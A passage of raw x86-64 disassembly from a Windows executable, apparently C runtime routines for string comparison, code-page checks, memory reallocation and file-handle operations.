   14000a45c:	83 3d 3d d9 00 00 00 	cmpl   $0x0,0xd93d(%rip)        # 0x140017da0
   14000a463:	0f 84 7b 15 00 00    	je     0x14000b9e4
   14000a469:	45 33 c9             	xor    %r9d,%r9d
   14000a46c:	e9 03 00 00 00       	jmp    0x14000a474
   14000a471:	cc                   	int3
   14000a472:	cc                   	int3
   14000a473:	cc                   	int3
   14000a474:	48 8b c4             	mov    %rsp,%rax
   14000a477:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a47b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a47f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a483:	57                   	push   %rdi
   14000a484:	48 83 ec 60          	sub    $0x60,%rsp
   14000a488:	48 8b f2             	mov    %rdx,%rsi
   14000a48b:	48 8b e9             	mov    %rcx,%rbp
   14000a48e:	49 8b d1             	mov    %r9,%rdx
   14000a491:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   14000a495:	49 8b f8             	mov    %r8,%rdi
   14000a498:	e8 77 a8 ff ff       	call   0x140004d14
   14000a49d:	48 85 ff             	test   %rdi,%rdi
   14000a4a0:	75 07                	jne    0x14000a4a9
   14000a4a2:	33 db                	xor    %ebx,%ebx
   14000a4a4:	e9 a0 00 00 00       	jmp    0x14000a549
   14000a4a9:	48 85 ed             	test   %rbp,%rbp
   14000a4ac:	74 05                	je     0x14000a4b3
   14000a4ae:	48 85 f6             	test   %rsi,%rsi
   14000a4b1:	75 17                	jne    0x14000a4ca
   14000a4b3:	e8 08 b3 ff ff       	call   0x1400057c0
   14000a4b8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a4be:	e8 dd b1 ff ff       	call   0x1400056a0
   14000a4c3:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000a4c8:	eb 7f                	jmp    0x14000a549
   14000a4ca:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000a4cf:	48 3b fb             	cmp    %rbx,%rdi
   14000a4d2:	76 12                	jbe    0x14000a4e6
   14000a4d4:	e8 e7 b2 ff ff       	call   0x1400057c0
   14000a4d9:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a4df:	e8 bc b1 ff ff       	call   0x1400056a0
   14000a4e4:	eb 63                	jmp    0x14000a549
   14000a4e6:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000a4eb:	48 8b 90 30 01 00 00 	mov    0x130(%rax),%rdx
   14000a4f2:	48 85 d2             	test   %rdx,%rdx
   14000a4f5:	75 17                	jne    0x14000a50e
   14000a4f7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   14000a4fc:	4c 8b c7             	mov    %rdi,%r8
   14000a4ff:	48 8b d6             	mov    %rsi,%rdx
   14000a502:	48 8b cd             	mov    %rbp,%rcx
   14000a505:	e8 2a 15 00 00       	call   0x14000ba34
   14000a50a:	8b d8                	mov    %eax,%ebx
   14000a50c:	eb 3b                	jmp    0x14000a549
   14000a50e:	8b 40 14             	mov    0x14(%rax),%eax
   14000a511:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a516:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a51a:	4c 8b cd             	mov    %rbp,%r9
   14000a51d:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   14000a521:	41 b8 01 10 00 00    	mov    $0x1001,%r8d
   14000a527:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000a52c:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000a530:	e8 0f 19 00 00       	call   0x14000be44
   14000a535:	85 c0                	test   %eax,%eax
   14000a537:	75 0d                	jne    0x14000a546
   14000a539:	e8 82 b2 ff ff       	call   0x1400057c0
   14000a53e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a544:	eb 03                	jmp    0x14000a549
   14000a546:	8d 58 fe             	lea    -0x2(%rax),%ebx
   14000a549:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000a54e:	74 0c                	je     0x14000a55c
   14000a550:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a555:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a55c:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000a561:	8b c3                	mov    %ebx,%eax
   14000a563:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000a567:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000a56b:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000a56f:	49 8b e3             	mov    %r11,%rsp
   14000a572:	5f                   	pop    %rdi
   14000a573:	c3                   	ret
   14000a574:	48 8b c4             	mov    %rsp,%rax
   14000a577:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a57b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000a57f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000a583:	55                   	push   %rbp
   14000a584:	41 56                	push   %r14
   14000a586:	41 57                	push   %r15
   14000a588:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   14000a58c:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000a593:	45 33 ff             	xor    %r15d,%r15d
   14000a596:	4c 8b f2             	mov    %rdx,%r14
   14000a599:	48 8b f1             	mov    %rcx,%rsi
   14000a59c:	4c 89 7d 17          	mov    %r15,0x17(%rbp)
   14000a5a0:	33 d2                	xor    %edx,%edx
   14000a5a2:	4c 89 7d 1f          	mov    %r15,0x1f(%rbp)
   14000a5a6:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000a5aa:	4c 89 7d 27          	mov    %r15,0x27(%rbp)
   14000a5ae:	4c 89 7d 2f          	mov    %r15,0x2f(%rbp)
   14000a5b2:	41 8b ff             	mov    %r15d,%edi
   14000a5b5:	4c 89 7d 37          	mov    %r15,0x37(%rbp)
   14000a5b9:	44 88 7d 3f          	mov    %r15b,0x3f(%rbp)
   14000a5bd:	4c 89 7d e7          	mov    %r15,-0x19(%rbp)
   14000a5c1:	4c 89 7d ef          	mov    %r15,-0x11(%rbp)
   14000a5c5:	4c 89 7d f7          	mov    %r15,-0x9(%rbp)
   14000a5c9:	4c 89 7d ff          	mov    %r15,-0x1(%rbp)
   14000a5cd:	4c 89 7d 07          	mov    %r15,0x7(%rbp)
   14000a5d1:	44 88 7d 0f          	mov    %r15b,0xf(%rbp)
   14000a5d5:	e8 3a a7 ff ff       	call   0x140004d14
   14000a5da:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000a5de:	bb e9 fd 00 00       	mov    $0xfde9,%ebx
   14000a5e3:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000a5e6:	75 16                	jne    0x14000a5fe
   14000a5e8:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a5ec:	74 0b                	je     0x14000a5f9
   14000a5ee:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a5f2:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a5f9:	44 8b c3             	mov    %ebx,%r8d
   14000a5fc:	eb 36                	jmp    0x14000a634
   14000a5fe:	e8 71 e1 ff ff       	call   0x140008774
   14000a603:	85 c0                	test   %eax,%eax
   14000a605:	75 19                	jne    0x14000a620
   14000a607:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a60b:	74 0b                	je     0x14000a618
   14000a60d:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a611:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a618:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000a61e:	eb 14                	jmp    0x14000a634
   14000a620:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a624:	74 0b                	je     0x14000a631
   14000a626:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a62a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a631:	45 8b c7             	mov    %r15d,%r8d
   14000a634:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   14000a638:	48 8b ce             	mov    %rsi,%rcx
   14000a63b:	e8 6c b2 ff ff       	call   0x1400058ac
   14000a640:	85 c0                	test   %eax,%eax
   14000a642:	0f 85 84 00 00 00    	jne    0x14000a6cc
   14000a648:	33 d2                	xor    %edx,%edx
   14000a64a:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000a64e:	e8 c1 a6 ff ff       	call   0x140004d14
   14000a653:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000a657:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000a65a:	75 13                	jne    0x14000a66f
   14000a65c:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a660:	74 42                	je     0x14000a6a4
   14000a662:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a666:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a66d:	eb 35                	jmp    0x14000a6a4
   14000a66f:	e8 00 e1 ff ff       	call   0x140008774
   14000a674:	85 c0                	test   %eax,%eax
   14000a676:	75 18                	jne    0x14000a690
   14000a678:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a67c:	74 0b                	je     0x14000a689
   14000a67e:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a682:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a689:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000a68e:	eb 14                	jmp    0x14000a6a4
   14000a690:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000a694:	74 0b                	je     0x14000a6a1
   14000a696:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000a69a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a6a1:	41 8b df             	mov    %r15d,%ebx
   14000a6a4:	44 8b c3             	mov    %ebx,%r8d
   14000a6a7:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   14000a6ab:	49 8b ce             	mov    %r14,%rcx
   14000a6ae:	e8 f9 b1 ff ff       	call   0x1400058ac
   14000a6b3:	48 8b 7d f7          	mov    -0x9(%rbp),%rdi
   14000a6b7:	85 c0                	test   %eax,%eax
   14000a6b9:	75 11                	jne    0x14000a6cc
   14000a6bb:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000a6bf:	48 8b d7             	mov    %rdi,%rdx
   14000a6c2:	ff 15 e0 3a 00 00    	call   *0x3ae0(%rip)        # 0x14000e1a8
   14000a6c8:	8b d8                	mov    %eax,%ebx
   14000a6ca:	eb 03                	jmp    0x14000a6cf
   14000a6cc:	41 8b df             	mov    %r15d,%ebx
   14000a6cf:	44 38 7d 0f          	cmp    %r15b,0xf(%rbp)
   14000a6d3:	74 08                	je     0x14000a6dd
   14000a6d5:	48 8b cf             	mov    %rdi,%rcx
   14000a6d8:	e8 7b b1 ff ff       	call   0x140005858
   14000a6dd:	44 38 7d 3f          	cmp    %r15b,0x3f(%rbp)
   14000a6e1:	74 09                	je     0x14000a6ec
   14000a6e3:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000a6e7:	e8 6c b1 ff ff       	call   0x140005858
   14000a6ec:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   14000a6f3:	00 
   14000a6f4:	8b c3                	mov    %ebx,%eax
   14000a6f6:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000a6fa:	49 8b 73 28          	mov    0x28(%r11),%rsi
   14000a6fe:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   14000a702:	49 8b e3             	mov    %r11,%rsp
   14000a705:	41 5f                	pop    %r15
   14000a707:	41 5e                	pop    %r14
   14000a709:	5d                   	pop    %rbp
   14000a70a:	c3                   	ret
   14000a70b:	cc                   	int3
   14000a70c:	4c 8b da             	mov    %rdx,%r11
   14000a70f:	4c 8b d1             	mov    %rcx,%r10
   14000a712:	4d 85 c0             	test   %r8,%r8
   14000a715:	75 03                	jne    0x14000a71a
   14000a717:	33 c0                	xor    %eax,%eax
   14000a719:	c3                   	ret
   14000a71a:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000a71e:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000a722:	41 0f b7 13          	movzwl (%r11),%edx
   14000a726:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000a72a:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000a72d:	83 f8 19             	cmp    $0x19,%eax
   14000a730:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000a734:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000a737:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000a73b:	83 f8 19             	cmp    $0x19,%eax
   14000a73e:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000a741:	41 8b c1             	mov    %r9d,%eax
   14000a744:	0f 47 ca             	cmova  %edx,%ecx
   14000a747:	2b c1                	sub    %ecx,%eax
   14000a749:	75 0b                	jne    0x14000a756
   14000a74b:	45 85 c9             	test   %r9d,%r9d
   14000a74e:	74 06                	je     0x14000a756
   14000a750:	49 83 e8 01          	sub    $0x1,%r8
   14000a754:	75 c4                	jne    0x14000a71a
   14000a756:	c3                   	ret
   14000a757:	cc                   	int3
   14000a758:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a75d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a762:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a767:	57                   	push   %rdi
   14000a768:	41 56                	push   %r14
   14000a76a:	41 57                	push   %r15
   14000a76c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a770:	4c 8b f1             	mov    %rcx,%r14
   14000a773:	48 85 c9             	test   %rcx,%rcx
   14000a776:	74 74                	je     0x14000a7ec
   14000a778:	33 db                	xor    %ebx,%ebx
   14000a77a:	4c 8d 3d 7f 58 ff ff 	lea    -0xa781(%rip),%r15        # 0x140000000
   14000a781:	bf e3 00 00 00       	mov    $0xe3,%edi
   14000a786:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   14000a789:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000a78f:	99                   	cltd
   14000a790:	49 8b ce             	mov    %r14,%rcx
   14000a793:	2b c2                	sub    %edx,%eax
   14000a795:	d1 f8                	sar    $1,%eax
   14000a797:	48 63 e8             	movslq %eax,%rbp
   14000a79a:	48 8b d5             	mov    %rbp,%rdx
   14000a79d:	48 8b f5             	mov    %rbp,%rsi
   14000a7a0:	48 03 d2             	add    %rdx,%rdx
   14000a7a3:	49 8b 94 d7 80 22 01 	mov    0x12280(%r15,%rdx,8),%rdx
   14000a7aa:	00 
   14000a7ab:	e8 5c ff ff ff       	call   0x14000a70c
   14000a7b0:	85 c0                	test   %eax,%eax
   14000a7b2:	74 13                	je     0x14000a7c7
   14000a7b4:	79 05                	jns    0x14000a7bb
   14000a7b6:	8d 7d ff             	lea    -0x1(%rbp),%edi
   14000a7b9:	eb 03                	jmp    0x14000a7be
   14000a7bb:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000a7be:	3b df                	cmp    %edi,%ebx
   14000a7c0:	7e c4                	jle    0x14000a786
   14000a7c2:	83 c8 ff             	or     $0xffffffff,%eax
   14000a7c5:	eb 0b                	jmp    0x14000a7d2
   14000a7c7:	48 03 f6             	add    %rsi,%rsi
   14000a7ca:	41 8b 84 f7 88 22 01 	mov    0x12288(%r15,%rsi,8),%eax
   14000a7d1:	00 
   14000a7d2:	85 c0                	test   %eax,%eax
   14000a7d4:	78 16                	js     0x14000a7ec
   14000a7d6:	3d e4 00 00 00       	cmp    $0xe4,%eax
   14000a7db:	73 0f                	jae    0x14000a7ec
   14000a7dd:	48 98                	cltq
   14000a7df:	48 03 c0             	add    %rax,%rax
   14000a7e2:	41 8b 84 c7 20 08 01 	mov    0x10820(%r15,%rax,8),%eax
   14000a7e9:	00 
   14000a7ea:	eb 02                	jmp    0x14000a7ee
   14000a7ec:	33 c0                	xor    %eax,%eax
   14000a7ee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a7f3:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000a7f8:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000a7fd:	48 83 c4 20          	add    $0x20,%rsp
   14000a801:	41 5f                	pop    %r15
   14000a803:	41 5e                	pop    %r14
   14000a805:	5f                   	pop    %rdi
   14000a806:	c3                   	ret
   14000a807:	cc                   	int3
   14000a808:	48 83 ec 28          	sub    $0x28,%rsp
   14000a80c:	48 85 c9             	test   %rcx,%rcx
   14000a80f:	75 19                	jne    0x14000a82a
   14000a811:	e8 aa af ff ff       	call   0x1400057c0
   14000a816:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a81c:	e8 7f ae ff ff       	call   0x1400056a0
   14000a821:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000a825:	48 83 c4 28          	add    $0x28,%rsp
   14000a829:	c3                   	ret
   14000a82a:	4c 8b c1             	mov    %rcx,%r8
   14000a82d:	33 d2                	xor    %edx,%edx
   14000a82f:	48 8b 0d e2 dd 00 00 	mov    0xdde2(%rip),%rcx        # 0x140018618
   14000a836:	48 83 c4 28          	add    $0x28,%rsp
   14000a83a:	48 ff 25 9f 39 00 00 	rex.W jmp *0x399f(%rip)        # 0x14000e1e0
   14000a841:	cc                   	int3
   14000a842:	cc                   	int3
   14000a843:	cc                   	int3
   14000a844:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a849:	57                   	push   %rdi
   14000a84a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a84e:	48 8b da             	mov    %rdx,%rbx
   14000a851:	48 8b f9             	mov    %rcx,%rdi
   14000a854:	48 85 c9             	test   %rcx,%rcx
   14000a857:	75 0a                	jne    0x14000a863
   14000a859:	48 8b ca             	mov    %rdx,%rcx
   14000a85c:	e8 ef d6 ff ff       	call   0x140007f50
   14000a861:	eb 1f                	jmp    0x14000a882
   14000a863:	48 85 db             	test   %rbx,%rbx
   14000a866:	75 07                	jne    0x14000a86f
   14000a868:	e8 eb af ff ff       	call   0x140005858
   14000a86d:	eb 11                	jmp    0x14000a880
   14000a86f:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000a873:	76 2d                	jbe    0x14000a8a2
   14000a875:	e8 46 af ff ff       	call   0x1400057c0
   14000a87a:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a880:	33 c0                	xor    %eax,%eax
   14000a882:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a887:	48 83 c4 20          	add    $0x20,%rsp
   14000a88b:	5f                   	pop    %rdi
   14000a88c:	c3                   	ret
   14000a88d:	e8 de 9d ff ff       	call   0x140004670
   14000a892:	85 c0                	test   %eax,%eax
   14000a894:	74 df                	je     0x14000a875
   14000a896:	48 8b cb             	mov    %rbx,%rcx
   14000a899:	e8 a6 e4 ff ff       	call   0x140008d44
   14000a89e:	85 c0                	test   %eax,%eax
   14000a8a0:	74 d3                	je     0x14000a875
   14000a8a2:	48 8b 0d 6f dd 00 00 	mov    0xdd6f(%rip),%rcx        # 0x140018618
   14000a8a9:	4c 8b cb             	mov    %rbx,%r9
   14000a8ac:	4c 8b c7             	mov    %rdi,%r8
   14000a8af:	33 d2                	xor    %edx,%edx
   14000a8b1:	ff 15 31 39 00 00    	call   *0x3931(%rip)        # 0x14000e1e8
   14000a8b7:	48 85 c0             	test   %rax,%rax
   14000a8ba:	74 d1                	je     0x14000a88d
   14000a8bc:	eb c4                	jmp    0x14000a882
   14000a8be:	cc                   	int3
   14000a8bf:	cc                   	int3
   14000a8c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a8c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a8ca:	57                   	push   %rdi
   14000a8cb:	48 83 ec 20          	sub    $0x20,%rsp
   14000a8cf:	49 8b f9             	mov    %r9,%rdi
   14000a8d2:	49 8b d8             	mov    %r8,%rbx
   14000a8d5:	8b 0a                	mov    (%rdx),%ecx
   14000a8d7:	e8 54 cf ff ff       	call   0x140007830
   14000a8dc:	90                   	nop
   14000a8dd:	48 8b 03             	mov    (%rbx),%rax
   14000a8e0:	48 63 08             	movslq (%rax),%rcx
   14000a8e3:	48 8b d1             	mov    %rcx,%rdx
   14000a8e6:	48 8b c1             	mov    %rcx,%rax
   14000a8e9:	48 c1 f8 06          	sar    $0x6,%rax
   14000a8ed:	4c 8d 05 5c d7 00 00 	lea    0xd75c(%rip),%r8        # 0x140018050
   14000a8f4:	83 e2 3f             	and    $0x3f,%edx
   14000a8f7:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000a8fb:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a8ff:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000a904:	74 24                	je     0x14000a92a
   14000a906:	e8 31 d0 ff ff       	call   0x14000793c
   14000a90b:	48 8b c8             	mov    %rax,%rcx
   14000a90e:	ff 15 dc 38 00 00    	call   *0x38dc(%rip)        # 0x14000e1f0
   14000a914:	33 db                	xor    %ebx,%ebx
   14000a916:	85 c0                	test   %eax,%eax
   14000a918:	75 1e                	jne    0x14000a938
   14000a91a:	e8 81 ae ff ff       	call   0x1400057a0
   14000a91f:	48 8b d8             	mov    %rax,%rbx
   14000a922:	ff 15 68 37 00 00    	call   *0x3768(%rip)        # 0x14000e090
   14000a928:	89 03                	mov    %eax,(%rbx)
   14000a92a:	e8 91 ae ff ff       	call   0x1400057c0
   14000a92f:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a935:	83 cb ff             	or     $0xffffffff,%ebx
   14000a938:	8b 0f                	mov    (%rdi),%ecx
   14000a93a:	e8 19 cf ff ff       	call   0x140007858
   14000a93f:	8b c3                	mov    %ebx,%eax
   14000a941:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a946:	48 83 c4 20          	add    $0x20,%rsp
   14000a94a:	5f                   	pop    %rdi
   14000a94b:	c3                   	ret
   14000a94c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a950:	48 83 ec 38          	sub    $0x38,%rsp
   14000a954:	48 63 d1             	movslq %ecx,%rdx
   14000a957:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000a95a:	75 0d                	jne    0x14000a969
   14000a95c:	e8 5f ae ff ff       	call   0x1400057c0
   14000a961:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a967:	eb 6c                	jmp    0x14000a9d5
   14000a969:	85 c9                	test   %ecx,%ecx
   14000a96b:	78 58                	js     0x14000a9c5
   14000a96d:	3b 15 dd da 00 00    	cmp    0xdadd(%rip),%edx        # 0x140018450
   14000a973:	73 50                	jae    0x14000a9c5
   14000a975:	48 8b ca             	mov    %rdx,%rcx
   14000a978:	4c 8d 05 d1 d6 00 00 	lea    0xd6d1(%rip),%r8        # 0x140018050
   14000a97f:	83 e1 3f             	and    $0x3f,%ecx
   14000a982:	48 8b c2             	mov    %rdx,%rax
   14000a985:	48 c1 f8 06          	sar    $0x6,%rax
   14000a989:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000a98d:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a991:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000a996:	74 2d                	je     0x14000a9c5
   14000a998:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a99d:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000a9a1:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000a9a5:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000a9aa:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000a9af:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a9b4:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a9b9:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a9be:	e8 fd fe ff ff       	call   0x14000a8c0
   14000a9c3:	eb 13                	jmp    0x14000a9d8
   14000a9c5:	e8 f6 ad ff ff       	call   0x1400057c0
   14000a9ca:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a9d0:	e8 cb ac ff ff       	call   0x1400056a0
   14000a9d5:	83 c8 ff             	or     $0xffffffff,%eax
   14000a9d8:	48 83 c4 38          	add    $0x38,%rsp
   14000a9dc:	c3                   	ret
   14000a9dd:	cc                   	int3
   14000a9de:	cc                   	int3
   14000a9df:	cc                   	int3
   14000a9e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a9e5:	55                   	push   %rbp
   14000a9e6:	56                   	push   %rsi
   14000a9e7:	57                   	push   %rdi
   14000a9e8:	41 54                	push   %r12
   14000a9ea:	41 55                	push   %r13
   14000a9ec:	41 56                	push   %r14
   14000a9ee:	41 57                	push   %r15
   14000a9f0:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   14000a9f5:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   14000a9fc:	48 8b 05 25 c6 00 00 	mov    0xc625(%rip),%rax        # 0x140017028
   14000aa03:	48 33 c4             	xor    %rsp,%rax
   14000aa06:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000aa0a:	48 63 f2             	movslq %edx,%rsi
   14000aa0d:	4d 8b f8             	mov    %r8,%r15
   14000aa10:	48 8b c6             	mov    %rsi,%rax
   14000aa13:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   14000aa17:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000aa1b:	48 8d 0d de 55 ff ff 	lea    -0xaa22(%rip),%rcx        # 0x140000000
   14000aa22:	83 e0 3f             	and    $0x3f,%eax
   14000aa25:	45 8b e9             	mov    %r9d,%r13d
   14000aa28:	4d 03 e8             	add    %r8,%r13
   14000aa2b:	4c 89 45 df          	mov    %r8,-0x21(%rbp)
   14000aa2f:	4c 8b e6             	mov    %rsi,%r12
   14000aa32:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   14000aa36:	49 c1 fc 06          	sar    $0x6,%r12
   14000aa3a:	4c 8d 34 c0          	lea    (%rax,%rax,8),%r14
   14000aa3e:	4a 8b 84 e1 50 80 01 	mov    0x18050(%rcx,%r12,8),%rax
   14000aa45:	00 
   14000aa46:	4a 8b 44 f0 28       	mov    0x28(%rax,%r14,8),%rax
   14000aa4b:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   14000aa4f:	ff 15 a3 37 00 00    	call   *0x37a3(%rip)        # 0x14000e1f8
   14000aa55:	33 d2                	xor    %edx,%edx
   14000aa57:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000aa5c:	89 45 a7             	mov    %eax,-0x59(%rbp)
   14000aa5f:	e8 b0 a2 ff ff       	call   0x140004d14
   14000aa64:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000aa69:	45 33 db             	xor    %r11d,%r11d
   14000aa6c:	44 89 5d 97          	mov    %r11d,-0x69(%rbp)
   14000aa70:	41 8b db             	mov    %r11d,%ebx
   14000aa73:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   14000aa76:	49 8b ff             	mov    %r15,%rdi
   14000aa79:	8b 51 0c             	mov    0xc(%rcx),%edx
   14000aa7c:	41 8b cb             	mov    %r11d,%ecx
   14000aa7f:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   14000aa83:	89 55 ab             	mov    %edx,-0x55(%rbp)
   14000aa86:	4d 3b fd             	cmp    %r13,%r15
   14000aa89:	0f 83 e2 03 00 00    	jae    0x14000ae71
   14000aa8f:	48 8b c6             	mov    %rsi,%rax
   14000aa92:	49 8b f7             	mov    %r15,%rsi
   14000aa95:	48 c1 f8 06          	sar    $0x6,%rax
   14000aa99:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000aa9d:	8a 0f                	mov    (%rdi),%cl
   14000aa9f:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   14000aaa5:	88 4c 24 44          	mov    %cl,0x44(%rsp)
   14000aaa9:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   14000aaae:	81 fa e9 fd 00 00    	cmp    $0xfde9,%edx
   14000aab4:	0f 85 70 01 00 00    	jne    0x14000ac2a
   14000aaba:	4c 8d 3d 3f 55 ff ff 	lea    -0xaac1(%rip),%r15        # 0x140000000
   14000aac1:	41 8b d3             	mov    %r11d,%edx
   14000aac4:	4d 8b 8c c7 50 80 01 	mov    0x18050(%r15,%rax,8),%r9
   14000aacb:	00 
   14000aacc:	49 8b f3             	mov    %r11,%rsi
   14000aacf:	4b 8d 04 f1          	lea    (%r9,%r14,8),%rax
   14000aad3:	44 38 5c 30 3e       	cmp    %r11b,0x3e(%rax,%rsi,1)
   14000aad8:	74 0b                	je     0x14000aae5
   14000aada:	ff c2                	inc    %edx
   14000aadc:	48 ff c6             	inc    %rsi
   14000aadf:	48 83 fe 05          	cmp    $0x5,%rsi
   14000aae3:	7c ee                	jl     0x14000aad3
   14000aae5:	48 85 f6             	test   %rsi,%rsi
   14000aae8:	0f 8e e0 00 00 00    	jle    0x14000abce
   14000aaee:	4b 8b 84 e7 50 80 01 	mov    0x18050(%r15,%r12,8),%rax
   14000aaf5:	00 
   14000aaf6:	4c 8b 45 af          	mov    -0x51(%rbp),%r8
   14000aafa:	4c 2b c7             	sub    %rdi,%r8
   14000aafd:	42 0f b6 4c f0 3e    	movzbl 0x3e(%rax,%r14,8),%ecx
